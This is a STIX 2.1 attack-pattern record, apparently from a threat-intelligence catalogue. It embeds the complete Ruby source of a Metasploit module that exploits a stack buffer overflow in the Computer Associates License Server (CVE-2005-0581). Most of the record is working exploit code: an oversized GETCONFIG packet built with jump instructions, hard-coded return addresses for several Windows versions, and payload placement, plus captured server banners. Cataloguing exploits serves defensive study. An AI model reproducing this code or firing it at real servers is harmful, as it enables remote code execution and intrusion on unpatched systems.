{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8cc96d67-af2f-40db-a4c5-1b7ab5f9f324",
    "created": "2024-08-14T16:48:45.360447Z",
    "modified": "2024-08-14T16:48:45.360451Z",
    "name": "Computer Associates License Server GETCONFIG Overflow",
    "description": " This module exploits an vulnerability in the CA License Server network service. By sending an excessively long GETCONFIG packet the stack may be overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/license/calicserv_getconfig.rb",
            "external_id": "calicserv_getconfig.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0581"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=213"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Computer Associates License Server GETCONFIG Overflow',\n      'Description'\t=> %q{\n          This module exploits an vulnerability in the CA License Server\n        network service. By sending an excessively long GETCONFIG\n        packet the stack may be overwritten.\n      },\n      'Author' =>\n        [\n          'hdm', # original msf v2 module\n          'aushack', # msf v3 port :)\n        ],\n      'License' => MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2005-0581' ],\n          [ 'OSVDB', '14389' ],\n          [ 'BID', '12705' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=213' ],\n        ],\n      'Privileged' => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload' =>\n        {\n          'Space'\t=> 600,\n          'BadChars' => \"\\x00\\x20\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'\t=> 'win',\n      'Targets' =>\n        [\n          # As much as I would like to return back to the DLL or EXE,\n          # all of those modules have a leading NULL in the\n          # loaded @ address :(\n          # name, jmp esi, writable, jmp edi\n          #['Automatic', {} ],\n          #\n          # aushack - tested OK Windows XP English SP0-1 only 20100214\n          ['Windows 2000 English',\t{ 'Rets' => [ 0x750217ae, 0x7ffde0cc, 0x75021421 ] } ], # ws2help.dll esi + peb + edi\n          ['Windows XP English SP0-1',\t{ 'Rets' => [ 0x71aa16e5, 0x7ffde0cc, 0x71aa19e8 ] } ], # ws2help.dll esi + peb + edi\n          ['Windows XP English SP2',\t{ 'Rets' => [ 0x71aa1b22, 0x71aa5001, 0x71aa1e08 ] } ], # ws2help.dll esi + .data + edi\n          ['Windows 2003 English SP0',\t{ 'Rets' => [ 0x71bf175f, 0x7ffde0cc, 0x71bf1a2c ] } ], # ws2help.dll esi + peb + edi\n        ],\n      'DisclosureDate' => '2005-03-02'))\n\n    register_options(\n      [\n        Opt::RPORT(10202),\n      ])\n  end\n\n  def check\n    connect\n    banner = sock.get_once\n    sock.put(\"A0 GETCONFIG SELF 0<EOM>\")\n    res = sock.get_once || ''\n    disconnect\n    if (res =~ /OS\\<([^\\>]+)/)\n      vprint_status(\"CA License Server reports OS: #{$1}\")\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n    banner = sock.get_once\n    if (banner !~ /GETCONFIG/)\n      print_status(\"The server did not return the expected greeting!\")\n    end\n\n    # exploits two different versions at once >:-)\n    # 144 -> return address of esi points to string middle\n    # 196 -> return address of edi points to string beginning\n    # 148 -> avoid exception by patching with writable address\n    # 928 -> seh handler (not useful under XP SP2)\n    buff = rand_text_alphanumeric(900)\n    buff[142, 2] = Rex::Arch::X86.jmp_short(8) \t\t# jmp over addresses\n    buff[144, 4] = [target['Rets'][0]].pack('V') \t\t# jmp esi\n    buff[148, 4] = [target['Rets'][1]].pack('V')\t\t# writable address\n    buff[194, 2] = Rex::Arch::X86.jmp_short(4)\t\t# jmp over address\n    buff[196, 4] = [target['Rets'][2]].pack('V')\t\t# jmp edi\n    buff[272, payload.encoded.length] = payload.encoded\n\n    sploit = \"A0 GETCONFIG SELF #{buff}<EOM>\"\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n\n=begin\neTrust: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.2>OLFFILE<0 0 0>SERVER<RMT>VERSION<0 1.61.0>NETWORK<192.168.3.22 unknown 255.255.255.0>MACHINE<PC_686_1_2084>CHECKSUMS<0 0 0 0 0 0 0 00 0 0 0>RMTV<1.3.1><EOM>\nBrightStor: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.54.0>NETWORK<11.11.11.111 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>\nlic98rmt.exe v0.1.0.15: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.61.0>NETWORK<192.168.139.128 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>\n=end\n",
    "x_mitre_disclosure_date": "2005-03-02",
    "x_mitre_platforms": [
        "win'"
    ]
}